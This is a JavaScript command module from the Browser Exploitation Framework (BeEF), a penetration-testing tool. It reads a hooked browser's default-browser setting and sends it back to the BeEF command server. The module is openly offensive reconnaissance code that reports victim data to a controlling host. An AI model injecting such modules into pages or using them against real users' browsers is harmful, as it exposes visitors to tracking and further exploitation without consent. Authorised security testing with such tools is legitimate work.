//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//
beef.execute(function() {

	beef.net.send("<%= @command_url %>", <%= @command_id %>, "browser="+beef.os.getDefaultBrowser());

});

